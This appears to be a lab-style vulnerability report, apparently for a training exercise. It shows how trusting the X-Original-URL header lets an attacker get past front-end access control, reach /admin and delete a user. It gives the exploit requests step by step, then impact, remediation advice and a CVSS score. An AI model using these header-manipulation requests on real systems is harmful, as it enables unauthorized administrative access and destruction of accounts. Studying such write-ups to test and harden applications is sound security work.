# Title: Access control vulnerabilities: URL-based access control can be circumvented

## Description

The application contains an administrative interface located at `/admin`. While direct external access to this endpoint is restricted by a front-end access control mechanism, the back-end application trusts the `X-Original-URL` HTTP header to determine the requested resource.

Because the front-end proxy validates the URL contained in the request line rather than the value supplied in the `X-Original-URL` header, an attacker can manipulate this header to access restricted functionality.

This inconsistency between front-end and back-end request processing allows unauthorized users to bypass access controls and interact with administrative endpoints.

---

## Steps to Exploit

### 1. Identify Restricted Functionality

Attempt to access the administrative panel:

```http id="3lx1h9"
GET /admin HTTP/1.1
```

The application returns an access denied response.

Example:

```text id="34mn4k"
Access denied
```

The response appears to originate from a front-end filtering system.

---

### 2. Test Header-Based URL Processing

Send the request to Burp Repeater.

Modify the request:

```http id="k3s2m0"
GET / HTTP/1.1
X-Original-URL: /invalid
```

Forward the request.

The application responds with:

```text id="v2mjw0"
Not Found
```

This indicates that the back-end application is processing the URL contained within the `X-Original-URL` header.

---

### 3. Access the Administrative Interface

Modify the request:

```http id="e4pr7d"
GET / HTTP/1.1
X-Original-URL: /admin
```

Forward the request.

The administrative panel becomes accessible.

---

### 4. Perform Administrative Actions

Locate the user deletion functionality.

Modify the request:

```http id="9g6ks3"
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

Forward the request.

The user account is successfully deleted.

---

## Proof of Concept

### Blocked Request

```http id="ljp4hv"
GET /admin HTTP/1.1
```

### Response

```text id="08yrjk"
Access denied
```

---

### Header Manipulation Test

```http id="0g7dtv"
GET / HTTP/1.1
X-Original-URL: /invalid
```

### Response

```text id="g7eqrj"
Not Found
```

---

### Administrative Access

```http id="swr7q2"
GET / HTTP/1.1
X-Original-URL: /admin
```

### Result

```text id="6h2p3z"
Administrative panel accessible
```

---

### Administrative Action

```http id="rj8jhh"
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

### Result

```text id="q9xy5z"
User deleted successfully
```

The successful execution confirms complete bypass of administrative access controls.

---

## Impact

* Unauthorized access to administrative functionality.
* Privilege escalation without authentication.
* Ability to perform sensitive administrative actions.
* Unauthorized modification or deletion of user accounts.
* Exposure of administrative data and functionality.
* Complete compromise of access control mechanisms.

---

## Mitigation / Remediation

### 1. Enforce Access Controls on the Back-End

Authorization checks must be performed by the application itself rather than relying solely on front-end filtering.

---

### 2. Remove Trust in User-Controlled Headers

Do not use externally supplied headers such as:

```text id="3mj4ab"
X-Original-URL
X-Rewrite-URL
X-Forwarded-Host
```

for authorization decisions.

---

### 3. Sanitize Proxy Headers

Ensure that reverse proxies strip or overwrite sensitive routing headers before forwarding requests.

Example:

```text id="sft6kp"
Remove X-Original-URL from incoming requests
```

---

### 4. Implement Consistent Request Validation

Ensure that front-end and back-end systems interpret URLs consistently.

---

### 5. Apply Principle of Least Privilege

Restrict administrative functionality to authenticated and authorized users only.

---

### 6. Conduct Access Control Testing

Regularly test for access control bypasses involving:

* Header manipulation
* URL rewriting
* Reverse proxy behavior
* Alternate routing mechanisms

---

## CVSS Score

**CVSS v3.1 Score:** 8.8 (High)

**Vector:**

```text id="w07w8j"
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

---

## CVSS Justification

| Metric              | Value     | Justification                                   |
| ------------------- | --------- | ----------------------------------------------- |
| Attack Vector       | Network   | Exploitable remotely through HTTP requests      |
| Attack Complexity   | Low       | Requires only modification of a request header  |
| Privileges Required | None      | No authentication required                      |
| User Interaction    | None      | No victim interaction required                  |
| Scope               | Unchanged | Impact remains within the application           |
| Confidentiality     | High      | Administrative functionality becomes accessible |
| Integrity           | High      | Administrative actions can be performed         |
| Availability        | None      | No direct service disruption observed           |

---

## Conclusion

The application is vulnerable to access control bypass because the back-end trusts the `X-Original-URL` header while the front-end access control mechanism validates only the URL contained in the request line. By manipulating this header, an attacker can access restricted administrative functionality and perform privileged actions without authorization. Proper back-end authorization checks and strict handling of proxy-related headers are required to prevent this vulnerability.
